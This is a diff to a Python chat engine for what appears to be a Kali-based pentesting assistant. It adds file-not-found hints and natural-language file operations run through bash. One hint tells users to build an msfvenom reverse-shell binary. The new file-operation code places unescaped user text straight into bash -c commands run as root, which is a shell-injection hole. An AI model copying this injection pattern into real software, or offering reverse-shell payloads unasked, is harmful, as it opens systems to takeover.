@@ -10881,18 +10881,33 @@ class CFAIChatEngine:
                 if first_word in _binary_tools:
                     file_arg = next((a for a in cmd[1:] if not a.startswith('-') and ('/' in a or '.' in a)), None)
                     if file_arg and not os.path.exists(file_arg):
-                        return {
-                            "success": True,
-                            "response": (
-                                f"File not found: `{file_arg}`\n\n"
-                                f"Upload your binary to the VPS first, then run:\n"
-                                f"  `{first_word} /path/to/binary`\n\n"
-                                f"To test with an existing binary:\n"
-                                f"  `{first_word} /bin/ls`"
-                            ),
-                            "category": "binary",
-                            "suggested_tools": [],
-                        }
+                        # Try resolving relative to /root
+                        alt = os.path.join('/root', file_arg.lstrip('./'))
+                        if os.path.exists(alt):
+                            cmd = [c if c != file_arg else alt for c in cmd]
+                        else:
+                            # List /root so user knows what files exist
+                            root_files = []
+                            try:
+                                root_files = os.listdir('/root')
+                            except Exception:
+                                pass
+                            files_hint = '\n'.join(f'  /root/{f}' for f in sorted(root_files)[:20]) or '  (empty)'
+                            return {
+                                "success": True,
+                                "response": (
+                                    f"File not found: `{file_arg}`\n\n"
+                                    f"**Files in /root:**\n{files_hint}\n\n"
+                                    f"**To create and upload a binary:**\n"
+                                    f"  From your local machine: `scp ./binary root@vps-ip:/root/binary`\n"
+                                    f"  Or create one now: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o /root/shell`\n\n"
+                                    f"**To test with existing binaries:**\n"
+                                    f"  `{first_word} /bin/ls`\n"
+                                    f"  `{first_word} /usr/bin/python3`"
+                                ),
+                                "category": "binary",
+                                "suggested_tools": [],
+                            }
             output = self._run_tool(cmd, timeout=60)
             return {
                 "success": True,
@@ -10922,6 +10937,90 @@ class CFAIChatEngine:
             }
 
         # ── Linux / Kali system commands passthrough ──────────────────────────
+        # ── Natural language file operations ─────────────────────────────────────
+        _file_op_kw = ["create file", "make file", "write to file", "write file",
+                       "add to file", "append to file", "insert into file",
+                       "edit file", "modify file", "replace in file", "update file",
+                       "delete file", "remove file", "rename file", "move file",
+                       "show file", "read file", "display file", "view file",
+                       "create folder", "make folder", "make directory", "create directory"]
+        if any(k in msg_lower for k in _file_op_kw):
+            _cwd = '/root' if os.path.isdir('/root') else '/tmp'
+            _env = dict(os.environ)
+            _env['PATH'] = self._TOOL_PATH + ':' + _env.get('PATH', '')
+            bash_cmd = None
+
+            # Extract file path from message
+            fp_m = re.search(r'["\']?(/[\w./\-]+|~/[\w./\-]+|[\w./\-]+\.\w+)["\']?', message)
+            fpath = fp_m.group(1) if fp_m else None
+            if fpath and not fpath.startswith('/') and not fpath.startswith('~'):
+                fpath = f'/root/{fpath}'
+
+            # Extract content between quotes or after "with content/with"
+            content_m = re.search(r'(?:with content|content:|containing|with text|saying|:\s*)["\']?(.+?)["\']?$',
+                                   message, re.IGNORECASE)
+            content = content_m.group(1).strip() if content_m else ""
+
+            if any(k in msg_lower for k in ["create file", "make file", "write file", "write to file"]):
+                if fpath and content:
+                    bash_cmd = f'mkdir -p "$(dirname "{fpath}")" && cat > "{fpath}" << \'CFAI_EOF\'\n{content}\nCFAI_EOF'
+                elif fpath:
+                    bash_cmd = f'mkdir -p "$(dirname "{fpath}")" && touch "{fpath}"'
+            elif any(k in msg_lower for k in ["add to file", "append to file", "insert into file"]):
+                if fpath and content:
+                    bash_cmd = f'echo "{content}" >> "{fpath}"'
+            elif any(k in msg_lower for k in ["edit file", "modify file", "update file"]):
+                # Replace pattern: "replace X with Y in file Z"
+                rep_m = re.search(r"replace ['\"]?(.+?)['\"]? with ['\"]?(.+?)['\"]?(?:\s+in|\s+inside)?", message, re.IGNORECASE)
+                if rep_m and fpath:
+                    old = rep_m.group(1).strip().replace("'", "'\\''")
+                    new = rep_m.group(2).strip().replace("'", "'\\''")
+                    bash_cmd = f"sed -i 's/{old}/{new}/g' \"{fpath}\""
+                elif fpath and content:
+                    bash_cmd = f'echo "{content}" >> "{fpath}"'
+            elif any(k in msg_lower for k in ["delete file", "remove file"]):
+                if fpath:
+                    bash_cmd = f'rm -f "{fpath}" && echo "Deleted: {fpath}"'
+            elif any(k in msg_lower for k in ["rename file", "move file"]):
+                dest_m = re.search(r'(?:to|as)\s+["\']?(/[\w./\-]+|[\w./\-]+\.\w+)["\']?', message)
+                if fpath and dest_m:
+                    dest = dest_m.group(1)
+                    if not dest.startswith('/'):
+                        dest = f'/root/{dest}'
+                    bash_cmd = f'mv "{fpath}" "{dest}" && echo "Moved: {fpath} -> {dest}"'
+            elif any(k in msg_lower for k in ["show file", "read file", "display file", "view file"]):
+                if fpath:
+                    bash_cmd = f'cat "{fpath}"'
+            elif any(k in msg_lower for k in ["create folder", "make folder", "make directory", "create directory"]):
+                if fpath:
+                    bash_cmd = f'mkdir -p "{fpath}" && echo "Created: {fpath}"'
+
+            if bash_cmd:
+                try:
+                    result = subprocess.run(['bash', '-c', bash_cmd],
+                                            capture_output=True, text=True, timeout=15,
+                                            env=_env, cwd=_cwd)
+                    out = ((result.stdout or '') + (result.stderr or '')).strip()
+                    if not out:
+                        out = f"Done. (exit {result.returncode})"
+                    # Follow up with ls to confirm
+                    if fpath and any(k in msg_lower for k in ["create", "make", "write", "add", "edit", "modify"]):
+                        parent = os.path.dirname(fpath)
+                        ls_r = subprocess.run(['bash', '-c', f'ls -lh "{parent}" 2>/dev/null || ls -lh /root'],
+                                              capture_output=True, text=True, timeout=5, env=_env)
+                        ls_out = (ls_r.stdout or '').strip()
+                        if ls_out:
+                            out += f"\n\n**Directory listing:**\n{ls_out}"
+                    return {
+                        "success": True,
+                        "response": f"```\n{bash_cmd}\n```\n\n{out}",
+                        "executed": True,
+                        "category": "system",
+                        "suggested_tools": [],
+                    }
+                except Exception as _e:
+                    pass  # Fall through to SYSTEM_CMDS handler
+
         if first_word in self.SYSTEM_CMDS:
             cmd_str = message.strip()
             _env = dict(os.environ)
